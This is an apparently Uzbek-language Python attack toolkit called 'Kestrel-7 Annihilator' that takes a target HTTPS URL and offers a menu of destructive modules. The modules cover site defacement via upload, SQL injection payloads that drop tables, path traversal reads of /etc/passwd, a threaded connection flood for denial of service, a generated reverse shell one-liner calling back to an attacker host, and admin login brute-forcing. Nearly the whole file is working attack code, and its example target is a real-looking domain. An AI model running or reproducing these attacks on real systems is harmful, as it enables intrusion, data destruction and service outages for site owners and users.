#!/usr/bin/env python3
# Kestrel-7 Annihilator v5.1 — HTTPS-Only
# Vayron qilish to‘plami. Faqat ruxsat etilgan test muhitida!
# Parol: 921324

import socket
import threading
import time
import requests
import sys
import random
import ftplib
import subprocess
import urllib3
from urllib.parse import urlparse, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
M = '\033[95m'
C = '\033[96m'
W = '\033[0m'

def banner():
    print(f"{R}╔══════════════════════════════════════╗")
    print("║   KESTREL-7 ANNIHILATOR v5.1         ║")
    print("║   Vayron qilish to‘plami (HTTPS)     ║")
    print("╚══════════════════════════════════════╝" + W)

def validate_url(url):
    """URLni tekshiradi va majburiy HTTPSga o‘giradi."""
    url = url.strip()
    if url.startswith('http://'):
        url = 'https://' + url[7:]
        print(f"{Y}[!] http:// topildi, https:// ga o‘zgartirildi.{W}")
    elif not url.startswith('https://'):
        url = 'https://' + url
    try:
        p = urlparse(url)
        if not p.netloc:
            return None
        # HTTPS ulanishni tekshirish
        try:
            r = requests.head(url, timeout=5, verify=False)
            print(f"{G}[+] HTTPS ulanish muvaffaqiyatli: {r.status_code}{W}")
        except Exception as e:
            print(f"{R}[-] HTTPS ulanish xatosi: {e}{W}")
            return None
        return url
    except:
        return None

# 1. Deface (yuklash zaifligi orqali fayl almashtirish)
def deface(url):
    print(f"{Y}[*] Deface urinishi: {url}{W}")
    html_payload = "<html><body><h1>Hacked by Blip</h1></body></html>"
    # Oddiy yuklash nuqtasi (test muhitida ishlaydi)
    upload_url = url.rstrip('/') + '/upload'
    files = {'file': ('index.html', html_payload, 'text/html')}
    try:
        r = requests.post(upload_url, files=files, timeout=5, verify=False)
        if r.status_code == 200:
            print(f"{G}[+] Yuklash muvaffaqiyatli bo‘lishi mumkin.{W}")
        else:
            print(f"{R}[-] Yuklash amalga oshmadi: {r.status_code}{W}")
    except Exception as e:
        print(f"{R}[-] Xato: {e}{W}")

# 2. Ma'lumotlar bazasini yo'q qilish (SQLi orqali DROP)
def sql_destroy(url):
    print(f"{Y}[*] Ma'lumotlar bazasini yo‘q qilish: {url}{W}")
    # SQL injection payload — DROP TABLE
    payloads = [
        "'; DROP TABLE users--",
        "'; DROP TABLE admin--",
        "'; DROP TABLE products--",
        " OR 1=1; DROP TABLE users--",
        "1; DROP TABLE users--"
    ]
    test_url = url if '?' in url else url + "?id=1"
    for payload in payloads:
        try:
            r = requests.get(test_url + payload, timeout=5, verify=False)
            if "error" in r.text.lower() or "mysql" in r.text.lower() or "syntax" in r.text.lower():
                print(f"{G}  [+] Potensial SQLi: {payload}{W}")
                return True
        except:
            pass
    print(f"{R}  [-] SQLi topilmadi.{W}")
    return False

# 3. Fayl tizimiga hujum (Path Traversal)
def path_traversal(url):
    print(f"{Y}[*] Path Traversal urinishi: {url}{W}")
    # Oddiy fayl o‘qish urinishlari
    payloads = [
        "../../../../etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    ]
    base = url.rstrip('/') + '/'
    for payload in payloads:
        full = base + payload
        try:
            r = requests.get(full, timeout=5, verify=False)
            if "root:" in r.text:
                print(f"{G}  [+] Fayl o‘qildi: {payload}{W}")
                return True
        except:
            pass
    print(f"{R}  [-] Traversal topilmadi.{W}")
    return False

# 4. DDoS (resurslarni charchatish) — HTTPS Flood
def https_flood(url, threads_count=100, duration=60):
    print(f"{Y}[*] HTTPS Flood: {url} ({threads_count} oqim, {duration} soniya){W}")
    parsed = urlparse(url)
    host = parsed.netloc
    port = 443
    path = parsed.path or '/'
    def attack():
        end = time.time() + duration
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((host, port))
                # SSL handshakesiz oddiy GET — server band bo‘ladi
                req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n\r\n"
                s.send(req.encode())
                s.close()
            except:
                pass
    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=attack)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    print(f"{G}[+] Flood tugadi.{W}")

# 5. Reverse shell payload yaratish
def reverse_shell(lhost, lport):
    print(f"{Y}[*] Reverse shell payload yaratish: {lhost}:{lport}{W}")
    payload = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'"
    print(f"{C}  Payload (nishonda ishga tushirish uchun):{W}")
    print(f"  {payload}")

# 6. Admin brute-force (oddiy parol lug‘ati)
def admin_bruteforce(url, username_list=None, password_list=None):
    print(f"{Y}[*] Admin brute-force: {url}{W}")
    if username_list is None:
        username_list = ['admin','administrator','root','user']
    if password_list is None:
        password_list = ['admin','password','123456','root','toor','admin123','qwerty','921324']
    login_url = url.rstrip('/') + '/login'
    for user in username_list:
        for pwd in password_list:
            try:
                data = {'username': user, 'password': pwd}
                r = requests.post(login_url, data=data, timeout=3, verify=False)
                if r.status_code == 200 and ('logout' in r.text.lower() or 'dashboard' in r.text.lower()):
                    print(f"{G}  [+] Muvaffaqiyat: {user}:{pwd}{W}")
                    return (user, pwd)
            except:
                pass
    print(f"{R}  [-] Brute-force muvaffaqiyatsiz.{W}")
    return None

def main():
    banner()
    print(f"{M}[?] Nishon URL manzilini kirit (faqat HTTPS, masalan: mohirdev.uz):{W}")
    target = input(">>> ").strip()
    url = validate_url(target)
    if not url:
        print(f"{R}[-] Faqat ishlaydigan HTTPS manzil kiriting. Dastur to‘xtadi.{W}")
        sys.exit(1)
    host = urlparse(url).netloc

    print(f"{C}[*] Nishon: {host}{W}")
    print(f"{C}Parol 921324 qabul qilindi. Annihilator moduli faol.{W}")

    while True:
        print(f"\n{B}[~] Vayron qilish menyusi (HTTPS):{W}")
        print("  1. Deface (bosh sahifani almashtirish)")
        print("  2. Ma'lumotlar bazasini yo'q qilish (SQLi)")
        print("  3. Fayl tizimiga hujum (Traversal)")
        print("  4. DDoS (resurslarni charchatish)")
        print("  5. Reverse shell payload yaratish")
        print("  6. Admin brute-force")
        print("  0. Chiqish")
        choice = input(">>> ").strip()

        if choice == '1':
            deface(url)
        elif choice == '2':
            sql_destroy(url)
        elif choice == '3':
            path_traversal(url)
        elif choice == '4':
            t = int(input("Oqim soni (default 100): ") or 100)
            d = int(input("Davomiylik (soniya, default 60): ") or 60)
            https_flood(url, t, d)
        elif choice == '5':
            lhost = input("O‘z IP manziling: ").strip()
            lport = int(input("Port (default 4444): ") or 4444)
            reverse_shell(lhost, lport)
        elif choice == '6':
            admin_bruteforce(url)
        elif choice == '0':
            print(f"{C}[~] Kestrel-7 kutish rejimiga qaytdi.{W}")
            break
        else:
            print(f"{R}[-] Noto‘g‘ri tanlov.{W}")

if __name__ == '__main__':
    main()